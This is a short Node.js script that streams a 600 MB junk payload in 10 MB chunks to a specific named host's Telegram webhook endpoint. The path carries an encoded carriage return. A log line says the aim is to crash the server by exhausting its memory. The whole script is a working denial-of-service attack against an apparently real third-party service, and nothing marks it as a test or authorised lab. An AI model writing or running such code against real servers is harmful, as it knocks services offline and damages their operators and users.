const https = require('https');

const payloadSize = 600 * 1024 * 1024; // 600 MB
const chunk = Buffer.alloc(10 * 1024 * 1024, 'A'); // 10MB chunk

console.log('Sending 600MB payload to crash the server...');

const req = https.request({
    hostname: 'groza-bot.alwaysdata.net',
    path: '/api/telegram-webhook-8516017309%0D',
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        'Content-Length': payloadSize
    }
}, (res) => {
    console.log('Status: ' + res.statusCode);
    res.on('data', (d) => console.log('Data:', d.toString()));
});

req.on('error', (e) => {
    console.log('Error (likely OOM or RangeError!): ' + e.message);
});

let sent = 0;
function sendNext() {
    if (sent >= payloadSize) {
        req.end();
        console.log('Finished sending.');
        return;
    }
    const canWrite = req.write(chunk);
    sent += chunk.length;
    console.log(`Sent ${sent / (1024 * 1024)} MB`);
    
    if (canWrite) {
        setImmediate(sendNext);
    } else {
        req.once('drain', sendNext);
    }
}
sendNext();
